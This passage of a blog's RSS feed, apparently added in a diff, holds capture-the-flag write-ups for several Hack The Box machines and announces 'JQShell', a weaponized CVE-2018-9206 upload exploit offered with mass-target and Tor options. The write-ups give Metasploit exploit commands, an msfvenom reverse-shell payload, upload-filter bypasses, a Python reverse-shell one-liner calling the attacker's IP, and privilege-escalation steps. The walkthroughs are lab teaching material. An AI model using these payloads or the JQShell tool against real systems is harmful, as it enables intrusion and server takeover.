+&lt;p&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;smbmap -H 10.10.10.3&lt;/code&gt;&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/images/posts/htb/lame/lame2.jpg&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;Our earlier nmap scan indicates the smbd version is 3.0.20, which is also outdated and has exploits available. Conveniently, metasploit also has a module for this.&lt;/p&gt;
+
+&lt;p&gt;###Exploitation&lt;/p&gt;
+
+&lt;p&gt;####4. Smbd 3.0.20 Exploit&lt;/p&gt;
+
+&lt;p&gt;Load up metasploit and simply load up the exploit for this version of smbd. Once the target is set and exploit is run, we have a root shell. Super simple.&lt;/p&gt;
+
+&lt;p&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;msf &amp;gt; use exploit/multi/samba/usermap_script
+msf &amp;gt; set RHOSTS 10.10.10.3
+msf &amp;gt; run&lt;/code&gt;&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/images/posts/htb/lame/lame3.jpg&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/images/posts/htb/lame/lame4.jpg&quot; /&gt;&lt;/p&gt;
+</description>
+        <pubDate>Fri, 08 Feb 2019 00:00:00 -0800</pubDate>
+        <link>/writeups/2019/02/08/HTB-Lame/</link>
+        <guid isPermaLink="true">/writeups/2019/02/08/HTB-Lame/</guid>
+      </item>
+    
+      <item>
+        <title>HTB - Nibbles Writeup</title>
+        <description>&lt;ul&gt;
+  &lt;li&gt;Box: Nibbles
+    &lt;ul&gt;
+      &lt;li&gt;Difficulty: Easy&lt;/li&gt;
+      &lt;li&gt;Points: 20&lt;/li&gt;
+      &lt;li&gt;Release: 13 Jan 2018&lt;/li&gt;
+      &lt;li&gt;IP: 10.10.10.75&lt;/li&gt;
+    &lt;/ul&gt;
+  &lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;p&gt;###Initial Enumeration&lt;/p&gt;
+
+&lt;p&gt;####1.Nmap Scanning&lt;/p&gt;
+
+&lt;p&gt;Starting with a scan of the target ip address:&lt;/p&gt;
+
+&lt;p&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;nmap -sC -sV -oA nibbles.nmap 10.10.10.75&lt;/code&gt;&lt;/p&gt;
+
+&lt;p&gt;We can see 22 and 80 are open. Let’s navigate to the web browser and access the webpage on port 80.&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/images/posts/htb/nibbles/nibbles1.jpg&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;####Directory Enumeration&lt;/p&gt;
+
+&lt;p&gt;Looking at the source code of the index.html, we can see a command referencing a directory named “&lt;strong&gt;/nibbleblog/&lt;/strong&gt;”.&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/images/posts/htb/nibbles/nibbles2.jpg&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;So let’s run gobuster in that directory to enumerate further.
+The following command will do the trick:&lt;/p&gt;
+
+&lt;p&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;gobuster dir -u http://10.10.10.75/nibbleblog -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x php&lt;/code&gt;&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/images/posts/htb/nibbles/nibbles3.jpg&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;Note the &lt;strong&gt;/admin.php&lt;/strong&gt; file. Accessing it, it appears to be an admin login page. Looking up default nibbleblog credentials and trying them manually actually works. The username admin:nibbles worked for me.&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/images/posts/htb/nibbles/nibbles4.jpg&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;Let’s enumerate some more and look into possible exploits available for nibbleblog. There is a file named &lt;strong&gt;README&lt;/strong&gt; that our gobuster found.&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/images/posts/htb/nibbles/nibbles5.jpg&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;Visiting that shows us the current nibble version is 4.0.3.&lt;/p&gt;
+
+&lt;p&gt;Next, we run &lt;code class=&quot;highlighter-rouge&quot;&gt;searchsploit&lt;/code&gt; to look for any nibbleblog exploits. That turns up a shell upload vulnerability.
+Meaning nibbleblog’s upload feature doesn’t actually check the file extension of image uploads. We can exploit this by uploading a reverse php shell using the upload plugin instead of an image.&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/images/posts/htb/nibbles/nibbles6.jpg&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;###Exploitation&lt;/p&gt;
+
+&lt;p&gt;####Payload Generation&lt;/p&gt;
+
+&lt;p&gt;I’m going to use the default php-reverse-shell.php script that comes with Kali and edit the &lt;strong&gt;$ip&lt;/strong&gt; and &lt;strong&gt;$port&lt;/strong&gt;.&lt;/p&gt;
+
+&lt;p&gt;Let’s also navigate to the image upload plugin and have a look at where we’ll be uploading this script.&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/images/posts/htb/nibbles/nibbles7.jpg&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;####Uploading Payload&lt;/p&gt;
+
+&lt;p&gt;I set up a netcat listener and upload the malicious file.&lt;/p&gt;
+
+&lt;p&gt;From there, I will want to browse to the specific file at:&lt;/p&gt;
+
+&lt;p&gt;&lt;strong&gt;http://10.10.10.75/nibbleblog/content/private/plugins/image.php&lt;/strong&gt;&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/images/posts/htb/nibbles/nibbles8.jpg&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;And now we have a reverse shell to the target machine.&lt;/p&gt;
+
+&lt;p&gt;To make the reverse connection fully interactive you follow the below steps:&lt;/p&gt;
+
+&lt;p&gt;&lt;a href=&quot;https://forum.hackthebox.eu/discussion/142/obtaining-a-fully-interactive-shell&quot;&gt;obtaining-a-fully-interactive-shell&lt;/a&gt;&lt;/p&gt;
+
+&lt;p&gt;We can then see we’re under the nibbler account and the user flag is under &lt;code class=&quot;highlighter-rouge&quot;&gt;/home/nibbler/user.txt&lt;/code&gt;&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/images/posts/htb/nibbles/nibbles9.jpg&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/images/posts/htb/nibbles/nibbles10.jpg&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;###Privilege Escalation&lt;/p&gt;
+
+&lt;p&gt;Running &lt;strong&gt;sudo -l&lt;/strong&gt; reveals an entry for &lt;strong&gt;/home/nibbler/personal/stuff/monitor.sh&lt;/strong&gt;. However, this file does not exist so it should be possible for us to create a bash script and run it as root.&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/images/posts/htb/nibbles/nibbles11.jpg&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;The script looks something like this. Super simple.&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/images/posts/htb/nibbles/nibbles12.jpg&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;Change it into an executable and run it with sudo.&lt;/p&gt;
+
+&lt;p&gt;And we have a root terminal from here we can simply find the root.txt file and finish the box.&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/images/posts/htb/nibbles/nibbles13.jpg&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;root.txt can be found in the &lt;strong&gt;/root&lt;/strong&gt; directory.&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/images/posts/htb/nibbles/nibbles14.jpg&quot; /&gt;&lt;/p&gt;
+</description>
+        <pubDate>Thu, 07 Feb 2019 00:00:00 -0800</pubDate>
+        <link>/writeups/2019/02/07/HTB-Nibbles/</link>
+        <guid isPermaLink="true">/writeups/2019/02/07/HTB-Nibbles/</guid>
+      </item>
+    
+      <item>
+        <title>Jqshell</title>
+        <description>&lt;p&gt;JQShell - A Weaponized Version Of CVE-2018-9206&lt;/p&gt;
+
+&lt;!--more--&gt;
+&lt;p&gt;&lt;img src=&quot;/images/posts/jqshellcmd.jpg&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;&lt;strong&gt;JQShell
+A weaponized version of CVE-2018-9206 (Unauthenticated arbitrary file upload vulnerability in Blueimp jQuery-File-Upload &amp;lt;= v9.22.0).&lt;/strong&gt;&lt;/p&gt;
+
+&lt;p&gt;&lt;strong&gt;Disclaimer
+Using this agianst servers you dont control, is illegal in most countries. The author claims no responsibility for the actions of those who use this software for illegal purposes. This software is intended for educational use only. No servers were illegally pwned in the making of this software.&lt;/strong&gt;&lt;/p&gt;
+
+&lt;p&gt;&lt;strong&gt;Prerequisites&lt;/strong&gt;
+&lt;br /&gt;
+Please install these required packages.&lt;/p&gt;
+
+&lt;p&gt;Python3&lt;/p&gt;
+&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;pip3 install requests pysocks subprocess stem
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;Tor Control Port
+To use tor, in this script, you must edit your torrc file and enable tor control port on 9051.
+Typically this file is here: /etc/tor/torrc
+open this file and uncomment this line:&lt;/p&gt;
+&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;ControlPort 9051
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+&lt;p&gt;to&lt;/p&gt;
+&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;ControlPort 9051
+restart tor service
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;&lt;strong&gt;Usage&lt;/strong&gt;&lt;/p&gt;
+
+&lt;p&gt;usage: jqshell.py [-h] [-l LIST_INIT] [-t SINGLE_TARGET] -s SHELL_LOC [-o OUTPUTZ] [-tor]&lt;/p&gt;
+
+&lt;p&gt;optional arguments:
+-h, –help show this help message and exit
+-l LIST_INIT, –list LIST_INIT
+Select for a list of assets to exploit
+-t SINGLE_TARGET, –target SINGLE_TARGET
+Single exploit target
+-s SHELL_LOC, –shell SHELL_LOC
+This is required, put the fullpath to your shell
+-o OUTPUTZ, –output OUTPUTZ
+This is full path to were you want to save your list
+of confirmed hosts
+-tor, –tor_proxy Select if you have tor installed, you will need to
+enable control port&lt;/p&gt;
+
+&lt;p&gt;&lt;strong&gt;Examples&lt;/strong&gt;&lt;/p&gt;
+
+&lt;p&gt;Running against single target.&lt;/p&gt;
+&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;python3 jqshell.py -t localhost/folderwerejqueryis -s /var/www/html/shell.php
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+&lt;p&gt;Running against single target, with saving output.&lt;/p&gt;
+&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;python3 jqshell.py -t localhost/folderwerejqueryis -s /var/www/html/shell.php -o pwned.txt
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+&lt;p&gt;Running a list, with saving output.&lt;/p&gt;
+&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;python3 jqshell.py -l /opt/jquery/test.txt -s /var/www/html/shell.php -o pwned.txt
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;&lt;strong&gt;Download Link:&lt;/strong&gt;&lt;/p&gt;
+
+&lt;p&gt;https://github.com/gunnerstahl/JQShell&lt;/p&gt;
+</description>
+        <pubDate>Thu, 10 Jan 2019 00:00:00 -0800</pubDate>
+        <link>/tools/2019/01/10/jqshell/</link>
+        <guid isPermaLink="true">/tools/2019/01/10/jqshell/</guid>
+      </item>
+    
+      <item>
+        <title>HTB - Popcorn Writeup</title>
+        <description>&lt;ul&gt;
+  &lt;li&gt;Box: Popcorn
+    &lt;ul&gt;
+      &lt;li&gt;Difficulty: Medium&lt;/li&gt;
+      &lt;li&gt;Points: 20&lt;/li&gt;
+      &lt;li&gt;Release: 15 Mar 2017&lt;/li&gt;
+      &lt;li&gt;IP: 10.10.10.6&lt;/li&gt;
+    &lt;/ul&gt;
+  &lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;p&gt;###Initial Enumeration&lt;/p&gt;
+
+&lt;p&gt;####1.Nmap Scanning&lt;/p&gt;
+
+&lt;p&gt;Starting with a scan of the target ip address:&lt;/p&gt;
+
+&lt;p&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;nmap -sC -sV -oA popcorn.nmap 10.10.10.6&lt;/code&gt;&lt;/p&gt;
+
+&lt;p&gt;We can see 22 and 80 are open. Let’s navigate to the web browser and access the webpage on port 80.&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/images/posts/htb/popcorn/popcorn1.jpg&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;####Directory Enumeration&lt;/p&gt;
+
+&lt;p&gt;Running Dirbuster with the lowercase medium directory list shows us a directory called “torrent”. So let’s navigate to that directory in the browser.&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/images/posts/htb/popcorn/popcorn2.jpg&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;After navigating to the page, we see that we can sign up and upload only &lt;strong&gt;.torrent&lt;/strong&gt; files&lt;/p&gt;
+
+&lt;p&gt;###Exploitation&lt;/p&gt;
+
+&lt;p&gt;####Testing what we can do/not do with uploads&lt;/p&gt;
+
+&lt;p&gt;Let’s upload a test .torrent file and see what happens:&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/images/posts/htb/popcorn/popcorn3.jpg&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;Note that after submitting the file, we can see an “Edit Settings” option. Clicking this shows us the ability to upload screenshots in PNG format.&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/images/posts/htb/popcorn/popcorn5.jpg&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/images/posts/htb/popcorn/popcorn4.jpg&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/images/posts/htb/popcorn/popcorn9.jpg&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;This upload has 2 checks. It will confirm the uploaded file matches valid image extensions and it will check the POST data &lt;strong&gt;Content-Type&lt;/strong&gt; is set to &lt;strong&gt;image/png&lt;/strong&gt;.&lt;/p&gt;
+
+&lt;p&gt;Simply create a reverse shell payload and name it something like “write.png.php”
+This command will generate one for you:&lt;/p&gt;
+
+&lt;p&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;msfvenom -p php/meterpreter/reverse_tcp lhost=10.10.14.9 lport=444 -f raw&lt;/code&gt;&lt;/p&gt;
+
+&lt;p&gt;Load up BurpSuite to intercept the file transfer. This will allow us to edit the parameters before they are forwarded to the web server.&lt;/p&gt;
+
+&lt;p&gt;Upload this file in the “Edit Settings” option as if it were a screenshot.&lt;/p&gt;
+
+&lt;p&gt;Your burpsuite should something like the below. You will want to change “application/php” to “image/png” and remove the “.png” portion from the filename.&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/images/posts/htb/popcorn/popcorn8.jpg&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;Our DirBuster results show a  “torrents” directory. Navigating to that shows us another “upload” directory within. Here we can see a list of all file uploads.&lt;/p&gt;
+
+&lt;p&gt;Next, we’re going to set up a listener and capture the reverse_tcp shell.&lt;/p&gt;
+
+&lt;p&gt;####Metasploit&lt;/p&gt;
+
+&lt;p&gt;Load up metasploit and set a listener for the php/meterpreter/reverse_tcp payload you just uploaded.&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/images/posts/htb/popcorn/popcorn7.jpg&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;Once the listener is started, you can go ahead and click on the file in the “/torrent/upload” directory.
+This should execute the file you uploaded and establish a connection back to your metasploit listener.
+&lt;img src=&quot;/images/posts/htb/popcorn/popcorn6.jpg&quot; /&gt;
+Once we’re in, the user flag can be found at &lt;strong&gt;/home/george/user.txt&lt;/strong&gt;&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/images/posts/htb/popcorn/popcorn11.jpg&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;###Privilege Escalation&lt;/p&gt;
+
+&lt;p&gt;Getting root is fairly trivial, we can use the known exploit called “full-nelson”.&lt;/p&gt;
+
+&lt;p&gt;We just need a way to get the C code for the exploit onto this machine.&lt;/p&gt;
+
+&lt;p&gt;More information on that exploit here: &lt;a href=&quot;https://www.exploit-db.com/exploits/15704&quot;&gt;exploits/15704&lt;/a&gt;&lt;/p&gt;
+
+&lt;p&gt;I just went ahead and setup a “&lt;strong&gt;python -m SimpleHTTPServer&lt;/strong&gt;” and used “&lt;strong&gt;wget&lt;/strong&gt;” to pull the file from my attacking box.&lt;/p&gt;
+
+&lt;p&gt;Once the file is present, compile it and run it like so:&lt;/p&gt;
+
+&lt;p&gt;You will get a root shell and can find the root flag in &lt;strong&gt;/root/root.txt&lt;/strong&gt;&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/images/posts/htb/popcorn/popcorn10.jpg&quot; /&gt;&lt;/p&gt;
+</description>
+        <pubDate>Sun, 06 Jan 2019 00:00:00 -0800</pubDate>
+        <link>/writeups/2019/01/06/HTB-Popcorn/</link>
+        <guid isPermaLink="true">/writeups/2019/01/06/HTB-Popcorn/</guid>
+      </item>
+    
+      <item>
+        <title>HTB - Legacy Writeup</title>
+        <description>&lt;ul&gt;
+  &lt;li&gt;Box: Legacy
+    &lt;ul&gt;
+      &lt;li&gt;Difficulty: Easy&lt;/li&gt;
+      &lt;li&gt;Points: 20&lt;/li&gt;
+      &lt;li&gt;Release: 15 Mar 2017&lt;/li&gt;
+      &lt;li&gt;IP: 10.10.10.4&lt;/li&gt;
+    &lt;/ul&gt;
+  &lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;p&gt;###Initial Enumeration&lt;/p&gt;
+
+&lt;p&gt;####1.Nmap Scanning&lt;/p&gt;
+
+&lt;p&gt;Starting with a scan of the target ip address:&lt;/p&gt;
+
+&lt;p&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;nmap -sC -sV -oA legacy.nmap 10.10.10.4&lt;/code&gt;&lt;/p&gt;
+
+&lt;p&gt;Based on the output of the nmap scan we can see that SMB port is open and the operating system is Windows XP.&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/images/posts/htb/legacy/legacy1.jpg&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;###Exploitation&lt;/p&gt;
+
+&lt;p&gt;####2.SMB Exploits&lt;/p&gt;
+
+&lt;p&gt;Now that we know the OS is Windows XP and SMB is open, lets do a quick google search.
+One of the first exploits we see is named “CVE-2008-4250” and there looks to be a Metasploit module for this. Lets give that a try.&lt;/p&gt;
+
+&lt;p&gt;More information on &lt;a href=&quot;https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2008-4250&quot;&gt;CVE-2008-4250&lt;/a&gt;&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/images/posts/htb/legacy/legacy2.jpg&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;User flag is at &lt;strong&gt;C:\Documents and Settings\john\Desktop\user.txt&lt;/strong&gt;&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/images/posts/htb/legacy/legacy3.jpg&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;Root flag is at &lt;strong&gt;C:\Documents and Settings\Administrator\Desktop\root.txt&lt;/strong&gt;&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/images/posts/htb/legacy/legacy4.jpg&quot; /&gt;&lt;/p&gt;
+</description>
+        <pubDate>Sat, 05 Jan 2019 00:00:00 -0800</pubDate>
+        <link>/writeups/2019/01/05/HTB-Legacy/</link>
+        <guid isPermaLink="true">/writeups/2019/01/05/HTB-Legacy/</guid>
+      </item>
+    
+      <item>
+        <title>HTB - Bashed Writeup</title>
+        <description>&lt;ul&gt;
+  &lt;li&gt;Box: Bashed
+    &lt;ul&gt;
+      &lt;li&gt;Difficulty: Easy&lt;/li&gt;
+      &lt;li&gt;Points: 20&lt;/li&gt;
+      &lt;li&gt;Release: 09 Dec 2017&lt;/li&gt;
+      &lt;li&gt;IP: 10.10.10.68&lt;/li&gt;
+    &lt;/ul&gt;
+  &lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;p&gt;###Initial Enumeration&lt;/p&gt;
+
+&lt;p&gt;####Nmap Scan
+Let’s start with a scan of the target ip address:&lt;/p&gt;
+
+&lt;p&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;nmap -sC -A -oN bashed.nmap 10.10.10.68&lt;/code&gt;&lt;/p&gt;
+
+&lt;ul&gt;
+  &lt;li&gt;-sC:  Default script&lt;/li&gt;
+  &lt;li&gt;-A:    Enable OS detection, version detection, script scanning, and traceroute&lt;/li&gt;
+  &lt;li&gt;-oN:  Output scan in normal format&lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;p&gt;The result shows only tcp/80 is open.&lt;/p&gt;
+
+&lt;p&gt;####Port 80&lt;/p&gt;
+
+&lt;p&gt;Browsing the webpage presents us with a phpbash development page.
+After a quick search of the site, there is nothing that stands out as potentially useful.&lt;/p&gt;
+
+&lt;p&gt;The next step would be to investigate if there are any hidden files or directories with GoBuster.&lt;/p&gt;
+
+&lt;p&gt;####GoBuster Directory Search&lt;/p&gt;
+
+&lt;p&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;gobuster dir -u http://10.10.10.68 -w /usr/share/dirbuster/wordlists/directory-list-2.3-medium.txt -x php&lt;/code&gt;&lt;/p&gt;
+
+&lt;p&gt;Navigate to /dev
+&lt;img src=&quot;/images/posts/htb/bashed/bashed2.jpg&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;####Get user.txt
+A simple &lt;code class=&quot;highlighter-rouge&quot;&gt;cat&lt;/code&gt; of the home directory of “arrexel” shows the user.txt flag.&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/images/posts/htb/bashed/bashed3.jpg&quot; /&gt;&lt;/p&gt;
+
+&lt;h3 id=&quot;5-get-reverse-shell&quot;&gt;5. Get Reverse Shell&lt;/h3&gt;
+
+&lt;p&gt;Run a netcat listener on your attacker box:
+&lt;code class=&quot;highlighter-rouge&quot;&gt;nc -nlvp 4444&lt;/code&gt;&lt;/p&gt;
+
+&lt;p&gt;To get a reverse shell, you can use the following python command:&lt;/p&gt;
+
+&lt;p&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((&quot;10.10.14.28&quot;,4444));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([&quot;/bin/sh&quot;,&quot;-i&quot;]);'  &lt;/code&gt;&lt;/p&gt;
+
+&lt;p&gt;Run that and you should get a reverse shell call as such:
+&lt;img src=&quot;/images/posts/htb/bashed4.jpg&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;Checking the &lt;code class=&quot;highlighter-rouge&quot;&gt;whoami&lt;/code&gt;, we see that we’re running as “www-data”. Run the below to pop a full shell:&lt;/p&gt;
+
+&lt;ul&gt;
+  &lt;li&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;python -c 'import pty;pty.spawn(&quot;/bin/bash&quot;);'&lt;/code&gt;&lt;/li&gt;
+  &lt;li&gt;Press &lt;code class=&quot;highlighter-rouge&quot;&gt;Ctrl + Z&lt;/code&gt; (to pause)&lt;/li&gt;
+  &lt;li&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;stty raw -echo&lt;/code&gt;&lt;/li&gt;
+  &lt;li&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;fg&lt;/code&gt; (to un-pause)&lt;/li&gt;
+  &lt;li&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;nc -nvlp 4444&lt;/code&gt;&lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;p&gt;&lt;img src=&quot;/images/posts/htb/bashed/bashed5.jpg&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;###Privilege Escalation&lt;/p&gt;
+
+&lt;p&gt;####Misconfigured Sudo Permissions&lt;/p&gt;
+
+&lt;p&gt;We check what the current user can run as sudo. We can see www-data can run all commands as scriptmanager without the need for a password.&lt;/p&gt;
+
+&lt;p&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;sudo -l&lt;/code&gt;&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/images/posts/htb/bashed/bashed6.jpg&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;Looking through the directories manually we see a folder named &lt;strong&gt;/scripts&lt;/strong&gt; which is owned by &lt;strong&gt;scriptmanager&lt;/strong&gt;.
+So lets run &lt;code class=&quot;highlighter-rouge&quot;&gt;sudo -u scriptmanager /bin/bash&lt;/code&gt; to spawn a bash shell and give full read/write access to the &lt;strong&gt;/scripts&lt;/strong&gt; folder&lt;/p&gt;
+
+&lt;p&gt;####Cronjobs &amp;amp; test.py script file&lt;/p&gt;
+
+&lt;p&gt;The file named &lt;strong&gt;test.py&lt;/strong&gt; looks to be executed every minute based on the timestamp of &lt;strong&gt;test.txt&lt;/strong&gt;. We can see the text file is owned by root so it is safe to presume that it is run as a root cron job.&lt;/p&gt;
+
+&lt;p&gt;Let’s just edit the &lt;strong&gt;test.py&lt;/strong&gt; or create a new python file in &lt;strong&gt;/scripts&lt;/strong&gt; to grab a shell as we know root will execute the contents of &lt;strong&gt;scripts&lt;/strong&gt;.&lt;/p&gt;
+
+&lt;p&gt;I used one of the various reverse shells listed &lt;a href=&quot;http://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet&quot;&gt;here&lt;/a&gt; and moved this file into the &lt;strong&gt;/scripts&lt;/strong&gt; directory.
+&lt;code class=&quot;highlighter-rouge&quot;&gt;cp /tmp/reverseshell.py &amp;gt; /scripts/test.py&lt;/code&gt;
+Set up a listener and wait for a second.
+And we got a connection as root.&lt;/p&gt;
+
+&lt;p&gt;&lt;strong&gt;Go ahead and cat the root flag under the root directory&lt;/strong&gt;&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/images/posts/htb/bashed/bashed7.jpg&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;cat root.txt&lt;/code&gt;
+&lt;img src=&quot;/images/posts/htb/bashed/bashed8.jpg&quot; /&gt;&lt;/p&gt;
+</description>
+        <pubDate>Sat, 05 Jan 2019 00:00:00 -0800</pubDate>
+        <link>/writeups/2019/01/05/HTB-Bashed/</link>
+        <guid isPermaLink="true">/writeups/2019/01/05/HTB-Bashed/</guid>
+      </item>
+    
+      <item>
+        <title>HTB - Blue Writeup</title>
+        <description>&lt;ul&gt;
+  &lt;li&gt;Box: Blue
+    &lt;ul&gt;
+      &lt;li&gt;Difficulty: Easy&lt;/li&gt;
+      &lt;li&gt;Points: 20&lt;/li&gt;
+      &lt;li&gt;Release: 28 Jul 2017&lt;/li&gt;
+      &lt;li&gt;IP: 10.10.10.40&lt;/li&gt;
+    &lt;/ul&gt;
+  &lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;p&gt;###Initial Enumeration&lt;/p&gt;
+
+&lt;p&gt;####1. Nmap Scanning&lt;/p&gt;
+
+&lt;p&gt;Starting with a scan of the target ip address:&lt;/p&gt;
+
+&lt;p&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;nmap -sC -sV -oA blue.nmap 10.10.10.40&lt;/code&gt;&lt;/p&gt;
+
+&lt;p&gt;Based on the output of the nmap scan we can determine this is a Windows machine. Ports 135,139 and 445.
+We also see a potential username “Haris”&lt;/p&gt;
+
+&lt;p&gt;The OS looks to be “Windows 7 SP1 7601 Build”.&lt;/p&gt;
+
+&lt;p&gt;Based on the name of this box and the SMB port being open, this box will potentially require an EternalBlue exploit.&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/images/posts/htb/blue/blue1.jpg&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;####2. SMB Enumeration&lt;/p&gt;
+
+&lt;p&gt;We can run &lt;strong&gt;smbmap&lt;/strong&gt; to see if we have access to any network shares with the anonymous user.&lt;/p&gt;
+
+&lt;p&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;smbmap -H 10.10.10.40 -u anonymous&lt;/code&gt;&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/images/posts/htb/blue/blue2.jpg&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;###Exploitation&lt;/p&gt;
+
+&lt;p&gt;####3. EternalBlue Exploit&lt;/p&gt;
+
+&lt;p&gt;Let’s use Metasploit and load up the following module:&lt;/p&gt;
+
+&lt;p&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;exploit/windows/smb/ms17_010_eternalblue&lt;/code&gt;&lt;/p&gt;
+
